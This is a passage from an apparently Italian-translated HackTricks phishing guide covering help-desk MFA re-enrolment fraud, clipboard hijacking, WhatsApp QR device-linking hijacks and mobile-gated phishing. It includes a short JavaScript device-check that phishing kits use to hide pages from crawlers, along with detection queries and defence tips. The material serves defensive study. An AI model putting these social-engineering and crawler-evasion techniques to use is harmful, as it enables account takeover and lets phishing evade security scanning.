Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata all'help desk, rendendo nullo il token esistente dell'utente.  Qualsiasi prompt di accesso successivo appare legittimo alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitora gli eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **entro pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli aggressori possono copiare silenziosamente comandi dannosi negli appunti della vittima da una pagina web compromessa o typosquatted e poi indurre l'utente a incollarli all'interno di **Win + R**, **Win + X** o di una finestra del terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Una pagina lure (ad esempio un falso “channel” di un ministero/CERT) mostra un QR di WhatsApp Web/Desktop e istruisce la vittima a scansionarlo, aggiungendo silenziosamente l'aggressore come **linked device**.<sup>[[12]](#references)</sup>
* L'aggressore ottiene immediatamente visibilità su chat e contatti finché la sessione non viene rimossa. In seguito le vittime potrebbero visualizzare una notifica “new device linked”; i difensori possono cercare eventi di collegamento di dispositivi imprevisti poco dopo le visite a pagine QR non attendibili.

### Mobile‑gated phishing to evade crawlers/sandboxes
Gli operatori limitano sempre più spesso i propri flussi di phishing mediante un semplice controllo del dispositivo, in modo che i crawler desktop non raggiungano mai le pagine finali. Un pattern comune consiste in un piccolo script che verifica la presenza di un DOM compatibile con il touch e invia il risultato a un endpoint del server; i client non-mobile ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobile viene servito il flusso completo.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Logica di `detect_device.js` (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server osservato frequentemente:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un placeholder) alle GET successive quando `is_mobile=false`; serve il phishing solo quando `true`.

Euristiche di hunting e rilevamento:
- Query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza di `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i dispositivi non mobile; i percorsi legittimi delle vittime mobile restituiscono 200 con HTML/JS successivi.
- Bloccare o esaminare attentamente le pagine che condizionano il contenuto esclusivamente a `ontouchstart` o a controlli simili del dispositivo.

Consigli per la difesa:
- Eseguire i crawler con fingerprint simili a quelli mobile e JS abilitato per rivelare i contenuti filtrati.
- Generare alert per risposte 500 sospette successive a `POST /detect` su domini registrati di recente.

## References

- [1] [Generazione delle variazioni di dominio utilizzate nel phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Individuare il phishing: strumenti e tecniche (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Rubare credenziali e bypassare la 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Rubare sessioni e bypassare la 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Come installare e configurare DKIM con Postfix su Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Report globale Unit 42 sulla risposta agli incidenti 2025 – Edizione social engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastrutture di phishing con accesso mobile e relative euristiche (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nuova frontiera degli attacchi di runtime assembly: uso degli LLM per generare JavaScript di phishing in tempo reale](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, click hijacking e TDS: all'interno di un ecosistema di distribuzione malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting di Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Hijacking del traffico verso windows.com di Microsoft tramite bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Amore? In realtà: una falsa dating app usata come esca in una campagna di spyware mirata in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC e sample di ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
